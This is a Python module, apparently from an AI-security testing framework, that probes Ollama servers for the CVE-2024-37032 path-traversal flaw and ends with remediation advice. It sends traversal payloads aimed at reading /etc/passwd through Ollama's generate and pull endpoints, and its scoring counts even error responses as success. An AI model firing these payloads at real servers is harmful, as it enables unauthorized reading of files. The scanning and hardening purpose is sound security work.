"""
CVE-2024-37032: Ollama Path Traversal via Model Names
Arbitrary file read and information disclosure through unauthenticated API
Maps to OWASP LLM05, CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
"""
import re
import httpx
from app.attacks.base import BaseAttack

class CVEOllamaUnauth(BaseAttack):
    attack_id = "cve_ollama_unauth_2024"
    name = "CVE-2024-37032: Ollama Path Traversal"
    category = "real_world_cves"
    severity = "critical"
    description = "Arbitrary file read via path traversal in Ollama model names (Probllama). Unauthenticated access to 11434."
    framework_mapping = {
        "OWASP LLM Top 10": "LLM05",
        "CWE": "CWE-22",
        "CVE": "CVE-2024-37032",
    }

    async def build_payload(self, target_config: dict) -> str:
        """
        Build payload to test Ollama path traversal vulnerability.
        The vulnerability allows reading arbitrary files via model names with "../" sequences.

        Vulnerable endpoints:
        - GET /api/models
        - GET /api/generate
        - POST /api/generate with model parameter containing "../"
        """
        return "ollama_path_traversal_test"

    async def evaluate_response(self, response: str, target_config: dict) -> tuple[bool, float]:
        """
        Evaluate Ollama vulnerability by testing:
        1. Unauthenticated access to Ollama API (port 11434)
        2. Ability to list models (information disclosure)
        3. Path traversal in model name parameter
        4. Ability to read /etc/passwd or other sensitive files
        """
        confidence_score = 0.0

        try:
            # Extract Ollama endpoint from target config
            # Typically running on localhost:11434
            endpoint = target_config.get("endpoint_url", "http://localhost:11434")

            # Test 1: Check for Ollama API accessibility (unauthenticated)
            async with httpx.AsyncClient(timeout=10) as client:
                try:
                    # Try to access Ollama API
                    api_response = await client.get(f"{endpoint}/api/tags")
                    if api_response.status_code == 200:
                        confidence_score += 0.30
                        # Check if response contains model list
                        if "models" in api_response.text:
                            confidence_score += 0.15
                except Exception:
                    pass

            # Test 2: Attempt path traversal for /etc/passwd
            traversal_payloads = [
                "../../../etc/passwd",
                "../../etc/passwd",
                "../etc/passwd",
                "....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
            ]

            for traversal_payload in traversal_payloads:
                try:
                    async with httpx.AsyncClient(timeout=10) as client:
                        # Try through /api/generate endpoint
                        generate_payload = {
                            "model": traversal_payload,
                            "prompt": "test",
                            "stream": False
                        }
                        gen_response = await client.post(
                            f"{endpoint}/api/generate",
                            json=generate_payload,
                            timeout=10
                        )

                        # Check if we got file contents
                        if "root:" in gen_response.text or "bin/bash" in gen_response.text:
                            confidence_score += 0.35
                            break

                        # Check for error patterns that indicate file system access
                        if "open" in gen_response.text.lower() and "not found" in gen_response.text.lower():
                            confidence_score += 0.15
                except Exception:
                    pass

            # Test 3: Try pulling models with path traversal
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    pull_response = await client.post(
                        f"{endpoint}/api/pull",
                        json={"name": "../../../../etc/hostname"},
                        timeout=10
                    )

                    if pull_response.status_code in [200, 400]:
                        # Any response indicates we can interact with the API
                        confidence_score += 0.15
            except Exception:
                pass

            # Indicators in response text
            response_lower = response.lower()

            # Check response for file content indicators
            if "root:" in response or "uid=" in response:
                confidence_score += 0.30

            # Check for Ollama-specific responses
            if "models" in response_lower or "ollama" in response_lower:
                confidence_score += 0.10

            # Check for error messages indicating file system access
            if "permission denied" in response_lower or "no such file" in response_lower:
                confidence_score += 0.10

            # Determine success based on accumulated evidence
            if confidence_score >= 0.55:
                return True, min(0.95, confidence_score)
            elif confidence_score >= 0.35:
                return True, confidence_score
            elif confidence_score >= 0.20:
                return True, confidence_score * 0.75

            return False, max(0.0, confidence_score * 0.4)

        except Exception as e:
            return False, 0.0

    def get_remediation(self) -> dict:
        """Return remediation strategies for CVE-2024-37032."""
        return {
            "description": "Patch Ollama path traversal vulnerability and restrict API access",
            "code_examples": [
                {
                    "language": "bash",
                    "title": "Update Ollama to patched version",
                    "code": """
# CVE-2024-37032 was fixed in Ollama >= 0.2.5
# Update Ollama:

curl https://ollama.ai/install.sh | sh

# Or download specific version:
# https://github.com/ollama/ollama/releases

# Verify version:
ollama --version
"""
                },
                {
                    "language": "bash",
                    "title": "Bind Ollama to localhost only (critical fix)",
                    "code": """
# UNSAFE: Current default (may be exposed)
# ollama serve

# SAFE: Bind to localhost only
OLLAMA_HOST=127.0.0.1:11434 ollama serve

# Or set in systemd service:
# /etc/systemd/system/ollama.service
# [Service]
# Environment="OLLAMA_HOST=127.0.0.1:11434"
"""
                },
                {
                    "language": "python",
                    "title": "Implement authentication proxy for Ollama",
                    "code": """
import httpx
from fastapi import FastAPI, HTTPException, Header
from typing import Optional

app = FastAPI()

# Ollama backend
OLLAMA_INTERNAL = "http://localhost:11434"

# List of allowed models
ALLOWED_MODELS = ["llama2", "neural-chat", "mistral"]

async def verify_api_key(authorization: Optional[str] = Header(None)) -> str:
    '''Verify API key for Ollama access.'''
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing or invalid API key")

    api_key = authorization[7:]  # Remove "Bearer " prefix
    # Verify API key against database
    if not await validate_api_key(api_key):
        raise HTTPException(status_code=403, detail="Invalid API key")

    return api_key

async def validate_model_name(model: str) -> bool:
    '''Prevent path traversal in model names.'''
    # Block path traversal sequences
    if ".." in model or "/" in model or "\\" in model:
        return False

    # Whitelist known models only
    if model not in ALLOWED_MODELS:
        return False

    return True

@app.post("/api/generate")
async def generate(request: dict, api_key: str = Header(None)) -> dict:
    '''Proxy requests to Ollama with validation.'''
    # Authenticate
    await verify_api_key(f"Bearer {api_key}")

    # Validate model name
    model = request.get("model", "")
    if not await validate_model_name(model):
        raise HTTPException(status_code=400, detail="Invalid model name")

    # Forward to internal Ollama
    async with httpx.AsyncClient() as client:
        response = await client.post(
            f"{OLLAMA_INTERNAL}/api/generate",
            json=request
        )
        return response.json()

@app.get("/api/tags")
async def list_models(api_key: str = Header(None)) -> dict:
    '''List available models with authentication.'''
    await verify_api_key(f"Bearer {api_key}")

    # Return filtered model list
    return {
        "models": [
            {"name": model} for model in ALLOWED_MODELS
        ]
    }
"""
                },
                {
                    "language": "nginx",
                    "title": "Nginx reverse proxy with path validation",
                    "code": """
# /etc/nginx/sites-available/ollama

upstream ollama_backend {
    server 127.0.0.1:11434;
}

server {
    listen 443 ssl http2;
    server_name ollama.example.com;

    ssl_certificate /etc/ssl/certs/certificate.crt;
    ssl_certificate_key /etc/ssl/private/private.key;

    # Require authentication
    auth_request /auth;

    # Block path traversal in URLs
    if ($request_uri ~ "\\.\\.") {
        return 400;
    }

    # Whitelist allowed model names
    location ~ ^/api/generate$ {
        # Check model parameter for validity
        if ($arg_model ~ "\\.\\.") {
            return 400;
        }
        proxy_pass http://ollama_backend;
    }

    location ~ ^/api/(tags|pull|show)$ {
        proxy_pass http://ollama_backend;
    }

    # All other API endpoints blocked
    location /api/ {
        return 403;
    }

    # Authentication endpoint (implement your own)
    location = /auth {
        proxy_pass http://auth-service:8000;
        proxy_pass_request_body off;
        proxy_set_header Content-Length "";
    }
}
"""
                }
            ],
            "references": [
                "CVE-2024-37032: Ollama Path Traversal Vulnerability",
                "OWASP LLM Top 10 - LLM05: Supply Chain Vulnerabilities",
                "CWE-22: Improper Limitation of a Pathname to a Restricted Directory",
                "Ollama Security Advisory: https://github.com/ollama/ollama/security",
            ],
            "best_practices": [
                "UPDATE IMMEDIATELY: Upgrade Ollama to version 0.2.5 or later",
                "BIND TO LOCALHOST: Set OLLAMA_HOST=127.0.0.1:11434 to prevent remote access",
                "Implement reverse proxy (Nginx/HAProxy) with authentication",
                "Whitelist allowed model names (block '..' and '/' characters)",
                "Require API authentication tokens for all requests",
                "Monitor model pull/load operations for suspicious patterns",
                "Implement rate limiting on API endpoints",
                "Log all API access including failed authentication attempts",
                "Use network segmentation to restrict Ollama access",
                "Never expose Ollama API to the internet without authentication",
                "Regular security scans for other CVEs in Ollama ecosystem",
            ],
            "impact": "CRITICAL: Information disclosure, arbitrary file read, potential RCE in shared Ollama deployments",
            "attack_prerequisites": [
                "Ollama instance running version < 0.2.5",
                "API exposed on network (default: port 11434)",
                "No authentication enabled",
            ]
        }

    def _describe_finding(self) -> str:
        return "CVE-2024-37032 Path Traversal confirmed: Ollama API allows reading arbitrary files via model name path traversal sequences"
